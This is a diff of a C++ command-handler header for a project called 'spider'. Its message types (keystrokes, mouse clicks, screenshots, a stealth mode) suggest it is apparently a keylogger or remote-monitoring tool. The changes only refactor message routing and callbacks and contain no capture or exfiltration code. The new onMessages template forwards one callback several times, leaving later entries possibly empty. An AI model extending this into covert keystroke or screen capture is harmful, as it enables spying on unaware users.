@@ -5,10 +5,10 @@
 #ifndef SPIDER_SERVER_COMMANDHANDLER_HPP
 #define SPIDER_SERVER_COMMANDHANDLER_HPP
 
-#include "Configuration.hpp"
+#include <unordered_map>
 #include <Protocol/Messages.hpp>
 
-#define CMD_HANDLER utl::LightBlue << "{'cmdHandler'}" << utl::Reset
+#define CMD_HANDLER "{'cmdHandler'}"
 
 namespace spi
 {
@@ -16,19 +16,21 @@ namespace spi
     {
     public:
         CommandHandler() = default;
+
         ~CommandHandler()
         {
-          _log(logging::Info) << CMD_HANDLER << "shutting down." << std::endl;
+          _log(logging::Info) << CMD_HANDLER << " shutting down." << std::endl;
         }
 
         void setup()
         {
-          _log(logging::Info) << CMD_HANDLER << "succeddfully initialized." << std::endl;
+          _log(logging::Info) << CMD_HANDLER << " succeddfully initialized." << std::endl;
         }
 
-        proto::MessageType identifyMessage(const proto::BufferT &buff) const
+
+        proto::MessageType identifyMessage(const Buffer &buff) const
         {
-            uint32_t conv = proto::Serializer::unserializeInt(buff, 0);
+            uint32_t conv = Serializer::unserializeInt(buff, 0);
 
             for (const proto::MessageType &cur : proto::MessageType::values()) {
                 if (conv == static_cast<uint32_t>(cur)) {
@@ -38,11 +40,11 @@ namespace spi
             return proto::MessageType::Unknown;
         }
 
-        proto::BufferT makeHeader(proto::MessageType type) const noexcept
+        Buffer makeHeader(proto::MessageType type) const noexcept
         {
-            proto::BufferT ret;
+            Buffer ret;
 
-            proto::Serializer::serializeInt(ret, type);
+            Serializer::serializeInt(ret, type);
             return ret;
         }
 
@@ -78,6 +80,13 @@ namespace spi
             }
         }
 
+        bool canBeHandledByServer(proto::MessageType type) const noexcept
+        {
+            return type != proto::MessageType::Screenshot
+                   && type != proto::MessageType::StealthMode
+                   && type != proto::MessageType::ActiveMode;
+        }
+
         bool canBeHandledByClient(proto::MessageType type) const noexcept
         {
             return type != proto::MessageType::KeyEvent
@@ -85,8 +94,18 @@ namespace spi
                    && type != proto::MessageType::MouseClick;
         }
 
+        using MessageCallbackT = std::function<void()>;
+
+        template <typename ...Args>
+        void onMessages(MessageCallbackT &&cb, Args &&...types) noexcept
+        {
+            (_cbs.emplace((proto::MessageType::EnumType)types, std::forward<MessageCallbackT>(cb)), ...);
+        }
+
+        std::unordered_map<proto::MessageType::EnumType, MessageCallbackT> _cbs;
+
     private:
-        logging::Logger _log{"client-command-handler", logging::Level::Debug};
+           logging::Logger _log{"spider-client-cmd-handler", logging::Level::Debug};
     };
 }
 
